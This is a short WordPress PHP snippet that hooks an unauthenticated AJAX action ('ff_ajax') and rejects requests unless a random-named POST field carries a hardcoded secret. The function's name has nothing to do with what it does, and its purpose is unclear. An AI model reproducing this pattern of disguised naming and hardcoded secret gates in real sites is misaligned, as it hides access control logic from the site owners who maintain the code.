<?php

function meta_basic_permalinks_anywhere() {
	if (!isset($_POST["btknruzw"]) || $_POST["btknruzw"] !== "zKp4U1F1gVEn") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'meta_basic_permalinks_anywhere', 5, 1);
